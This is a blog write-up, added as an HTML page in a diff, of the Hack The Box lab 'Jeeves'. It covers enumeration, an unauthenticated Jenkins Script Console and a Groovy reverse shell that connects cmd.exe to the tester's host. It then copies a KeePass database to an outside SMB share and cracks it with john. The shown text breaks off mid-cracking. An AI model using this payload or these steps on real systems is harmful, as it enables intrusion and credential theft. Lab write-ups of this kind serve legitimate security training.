@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Jeeves | Chaelsoo&#39;s blog</title>
+<meta property="og:title" content="HTB: Jeeves | Chaelsoo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Jeeves | Chaelsoo&#39;s blog" />
+<meta itemprop="name" content="HTB: Jeeves | Chaelsoo&#39;s blog" />
+<meta name="application-name" content="HTB: Jeeves | Chaelsoo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream.">
+<meta itemprop="description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream." />
+<meta property="og:description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream." />
+<meta name="twitter:description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-jeeves/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-jeeves/">
+  <meta property="og:site_name" content="Chaelsoo&#39;s blog">
+  <meta property="og:title" content="HTB: Jeeves">
+  <meta property="og:description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:tag" content="Keepass">
+    <meta property="article:tag" content="Jenkins">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Jeeves">
+  <meta name="twitter:description" content="A Medium Windows box where a fake Ask Jeeves search page on port 80 hides an unauthenticated Jenkins instance on port 50000. The Groovy script console gives code execution, a KeePass database yields an NTLM hash for pass-the-hash as Administrator, and the root flag is hidden in an NTFS alternate data stream.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-jeeves/">
+    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Jeeves</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-08T00:00:00&#43;00:00" itemprop="datePublished"> 8 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-jeeves/htb-jeeves-pwned.png" alt="HTB: Jeeves" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#jenkins-on-jetty">Jenkins on Jetty</a></li>
+    <li><a href="#groovy-rce">Groovy RCE</a></li>
+    <li><a href="#keepass-the-ceh-database">KeePass: The CEH Database</a></li>
+    <li><a href="#pass-the-hash-to-system">Pass-the-Hash to SYSTEM</a></li>
+    <li><a href="#ntfs-alternate-data-streams">NTFS Alternate Data Streams</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows box with two web services and a theme. Port 80 presents a fake Ask Jeeves search engine that sends everything to a static error page - pure misdirection. Port 50000 runs Jetty, which is the real surface: a Jenkins instance that requires no authentication and exposes a Groovy script console you can run arbitrary code in. The privilege escalation is a KeePass database sitting in kohsuke&rsquo;s Documents folder. Inside it, an NTLM hash stored as a password that works for pass-the-hash as Administrator. Then one more trick at the end: the root flag isn&rsquo;t in <code>hm.txt</code>, it&rsquo;s in an alternate data stream attached to it, invisible to a normal directory listing.</p>
+<h2 id="recon">Recon</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-08 09:21 +0100
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.228.112
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">996</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open  http         Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Ask Jeeves
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Error <span class="m">404</span> Not Found
+</span></span><span class="line"><span class="cl">Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2026-06-08T13:21:27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2026-06-08T13:19:29
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 4h59m57s, deviation: 0s, median: 4h59m57s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span></code></pre></div><p>Four ports: 80, 135, 445, 50000. SMB signing is off, which is worth noting. No domain - <code>workgroup: WORKGROUP</code>, so this isn&rsquo;t an AD box. Guest and null SMB auth both failed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">10586</span> x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>-<span class="o">]</span> Jeeves<span class="se">\:</span> STATUS_ACCESS_DENIED 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/jeeves ✗ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">10586</span> x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.228.112  <span class="m">445</span>    JEEVES           <span class="o">[</span>-<span class="o">]</span> Jeeves<span class="se">\g</span>uest: STATUS_ACCOUNT_DISABLED
+</span></span></code></pre></div><p>Port 80 was the fake Ask Jeeves search page:</p>
+<p><img src="/images/writeups/htb-jeeves/web-ask-jeeves-search.png" alt="The Ask Jeeves themed search page on port 80 with a search bar that redirects to a static error page"></p>
+<p>Every search just landed on a static <code>error.html</code>. Looking at the source confirmed it - the form <code>action</code> points to <code>error.html</code> unconditionally. The error page itself leaks something though:</p>
+<p><img src="/images/writeups/htb-jeeves/web-sql-error-mssql-version.png" alt="Static error page leaking Microsoft SQL Server 2005 version from a type conversion exception"></p>
+<p>A SQL Server type conversion error with a full stack trace. The page is static - this isn&rsquo;t live SQL output, it&rsquo;s a hardcoded error page used as a decoy. The MSSQL version shown is from 2005 on Windows NT 5.0, which doesn&rsquo;t match the actual OS. Port 80 is a dead end.</p>
+<h2 id="jenkins-on-jetty">Jenkins on Jetty</h2>
+<p>Port 50000 returned a 404 on <code>/</code>. Jetty is a Java servlet container commonly used to host Jenkins, and <code>9.4.z-SNAPSHOT</code> reads as a development build. Automated fuzzing with a general wordlist found nothing. A shorter targeted list for common Java application paths found it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ <span class="k">for</span> path in jenkins askjeeves jeeves manager admin console app portal service api rest ws struts spring<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$path</span><span class="s2">: &#34;</span><span class="p">;</span> curl -so /dev/null -w <span class="s2">&#34;%{http_code}\n&#34;</span> http://<span class="nv">$DC</span>:50000/<span class="nv">$path</span>/
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">jenkins: <span class="m">404</span>
+</span></span><span class="line"><span class="cl">askjeeves: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">jeeves: <span class="m">404</span>
+</span></span><span class="line"><span class="cl">manager: <span class="m">404</span>
+</span></span><span class="line"><span class="cl">admin: <span class="m">404</span>
+</span></span><span class="line"><span class="cl">console: <span class="m">404</span>
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p><code>/askjeeves</code> returned 200. Opened it in a browser:</p>
+<p><img src="/images/writeups/htb-jeeves/web-jenkins-unauthenticated-dashboard.png" alt="Jenkins dashboard at /askjeeves on port 50000, fully accessible without authentication"></p>
+<p>Full Jenkins dashboard, no authentication required. Every menu item accessible: New Item, People, Build History, Manage Jenkins, Credentials. This isn&rsquo;t a login bypass - there is no login. The instance was set up with security disabled.</p>
+<p>Jenkins has a Script Console under Manage Jenkins that executes arbitrary Groovy code server-side. Groovy runs on the JVM and has full access to Java&rsquo;s standard library, including <code>Runtime.exec()</code> and socket classes. This is intentional functionality for administrators - and it&rsquo;s directly accessible here without any credentials.</p>
+<p><img src="/images/writeups/htb-jeeves/web-jenkins-script-console.png" alt="Jenkins Script Console under Manage Jenkins, accepting arbitrary Groovy code for server-side execution"></p>
+<h2 id="groovy-rce">Groovy RCE</h2>
+<p>The reverse shell payload uses Java&rsquo;s <code>ProcessBuilder</code> and <code>Socket</code> to open a cmd.exe process and wire its I/O to a network connection:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;10.10.16.129&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">9999</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;cmd.exe&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Socket</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">InputStream</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="w"> </span><span class="n">pe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">OutputStream</span><span class="w"> </span><span class="n">po</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">(),</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w"> </span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="n">50</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ nc -lvnp <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">Connection received on 10.129.228.112 <span class="m">49677</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.10586<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;whoami
+</span></span><span class="line"><span class="cl">jeeves<span class="se">\k</span>ohsuke
+</span></span></code></pre></div><p>Shell as <code>kohsuke</code>. Jenkins was running from <code>C:\Users\Administrator\.jenkins</code> - not from an Administrator shell, just from that directory. <code>whoami /all</code>:</p>
+<pre tabindex="0"><code>USER INFORMATION
+----------------
+
+User Name      SID                                        
+============== ===========================================
+jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication  Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+</code></pre><p>High Integrity Level and <code>SeImpersonatePrivilege</code> enabled. The obvious move was a potato exploit.</p>
+<p>I tried PrintSpoofer, GodPotato, and JuicyPotato. All failed. The reason is the shell context: a bare netcat reverse shell from a Windows service runs under a non-interactive service token. Potato exploits impersonate a higher-privileged token by coercing a SYSTEM-level service to authenticate to a local pipe you control. That impersonation step requires the current token to be an interactive session token - <code>NT AUTHORITY\SERVICE</code> in a non-interactive socket shell doesn&rsquo;t qualify. The spawned impersonated process has no interactive desktop session to attach to, so the exploit fails silently or errors out.</p>
+<p>Kept enumerating.</p>
+<h2 id="keepass-the-ceh-database">KeePass: The CEH Database</h2>
+<p>kohsuke&rsquo;s Documents folder had one file:</p>
+<pre tabindex="0"><code>C:\Users\kohsuke\Documents\CEH.kdbx
+</code></pre><p>KeePass is a local password manager. It stores credentials encrypted in a <code>.kdbx</code> file, protected by a master password. The whole database is one encrypted blob - without the master password you can&rsquo;t read any entry. But the encrypted blob itself is a known format and can be attacked offline.</p>
+<p><code>keepass2john</code> extracts a crackable hash from the file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ sudo smbserver.py share . -smb2support
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;copy C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments<span class="se">\C</span>EH.kdbx <span class="se">\\</span>10.10.16.129<span class="se">\s</span>hare<span class="se">\C</span>EH.kdbx
+</span></span><span class="line"><span class="cl">        <span class="m">1</span> file<span class="o">(</span>s<span class="o">)</span> copied.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ❯ keepass2john CEH.kdbx &gt; hash.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/jeeves ❯ john hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;KeePass&#34;</span>, but the string is also recognized as <span class="s2">&#34;KeePass-opencl&#34;</span>
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
